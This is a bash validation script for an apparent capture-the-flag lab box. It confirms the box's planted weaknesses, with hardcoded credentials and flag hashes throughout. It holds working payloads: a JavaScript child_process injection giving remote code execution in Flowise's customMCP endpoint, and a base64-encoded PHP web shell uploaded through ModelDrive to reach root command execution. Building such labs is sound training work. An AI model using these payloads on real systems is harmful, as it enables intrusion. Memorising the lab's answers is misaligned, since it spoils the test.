#!/usr/bin/env bash
set -Eeuo pipefail

failures=0

check() {
  local name="$1"
  shift
  echo "[validate] ${name}"
  if "$@"; then
    echo "[pass] ${name}"
  else
    echo "[fail] ${name}" >&2
    failures=$((failures + 1))
  fi
}

http_contains() {
  local host="$1"
  local pattern="$2"
  local body
  body="$(curl -fsS -H "Host: ${host}" "http://127.0.0.1/")"
  grep -qiE "$pattern" <<<"$body"
}

flowise_login() {
  curl -fsS -H 'Host: flowise.flow.ethci' \
    -H 'Content-Type: application/json' \
    -d '{"email":"admin@flow.ethci","password":"1JETB@9eYIZ8J!"}' \
    http://127.0.0.1/api/v1/auth/login | grep -q 'token'
}

flowise_rce() {
  rm -f /tmp/flowise-rce-validation
  curl -fsS -H 'Host: flowise.flow.ethci' \
    -H 'Content-Type: application/json' \
    -d '{"loadMethod":"listActions","inputs":{"mcpServerConfig":"({x:(function(){const cp = process.mainModule.require(\"child_process\");cp.execSync(\"touch /tmp/flowise-rce-validation\");return 1;})()})"}}' \
    http://127.0.0.1/api/v1/node-load-method/customMCP >/dev/null
  test -f /tmp/flowise-rce-validation
}

modeldrive_local_only() {
  ss -ltn | grep -q '127.0.0.1:8000' && ! ss -ltn | grep -qE '0\.0\.0\.0:8000|:::8000'
}

modeldrive_auth_and_root_upload() {
  local jar="/tmp/modeldrive-cookie.txt"
  local payload="/tmp/modeldrive-shell.pt"
  local shell_path="/var/www/ModelDrive/src/shell.php"
  local result=0
  rm -f "$jar" "$payload" "$shell_path"
  if ! curl -fsS -c "$jar" \
    -H 'Content-Type: application/json' \
    -d '{"username":"sakiko","password":"2cute4u"}' \
    http://127.0.0.1:8000/auth.php | grep -q '"ok":true'; then
    result=1
  elif ! printf '%s' 'PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==' | base64 -d > "$payload"; then
    result=1
  elif ! curl -fsS -b "$jar" \
    -F 'dest=shell.php' \
    -F "file=@${payload};type=application/octet-stream" \
    http://127.0.0.1:8000/upload.php | grep -qi 'uploaded successfully'; then
    result=1
  elif ! curl -fsS 'http://127.0.0.1:8000/shell.php?cmd=id' | grep -q 'uid=0'; then
    result=1
  fi
  rm -f "$jar" "$payload" "$shell_path"
  return "$result"
}

check "Apache WordPress vhost responds" http_contains flow.ethci 'AI-overflow|WordPress|ModelDrive'
check "Apache Flowise vhost responds" http_contains flowise.flow.ethci 'Flowise 3.0.4|Flowise'
check "Ultimate Member 2.6.6 is installed" grep -q 'Version: 2.6.6' /var/www/wordpress/wp-content/plugins/ultimate-member/ultimate-member.php
check "WordPress draft leaks Flowise host and credential" bash -lc "wp post list --post_status=draft --field=ID --path=/var/www/wordpress --allow-root | xargs -r -I{} wp post get {} --field=post_content --path=/var/www/wordpress --allow-root | grep -q 'flowise.flow.ethci' && wp post list --post_status=draft --field=ID --path=/var/www/wordpress --allow-root | xargs -r -I{} wp post get {} --field=post_content --path=/var/www/wordpress --allow-root | grep -q 'admin@flow.ethci'"
check "Flowise credential login works" flowise_login
check "Flowise customMCP RCE surface executes as service user" flowise_rce
check "ModelDrive binds only to localhost:8000" modeldrive_local_only
check "ModelDrive config path exists" test -f /var/www/ModelDrive/src/config.json
check "sakiko sudoedit rule exists" grep -q 'sudoedit /var/www/ModelDrive/src/config.json' /etc/sudoers.d/sakiko-modeldrive
check "User flag exists" grep -q 'd11de95f4be9c2cda197e93ac00927a6' /home/sakiko/user.txt
check "Root flag exists" grep -q '0b56ee4d92e42cca7544e78a39ea0d8c' /root/root.txt
check "Dynamic flag files exist" bash -lc "test -f /root/flags.list && test -x /root/flag.sh"
check "ModelDrive upload bypass reaches root command execution" modeldrive_auth_and_root_upload

if [ "$failures" -ne 0 ]; then
  echo "[validate] ${failures} checks failed" >&2
  exit 1
fi

echo "[validate] all checks passed"
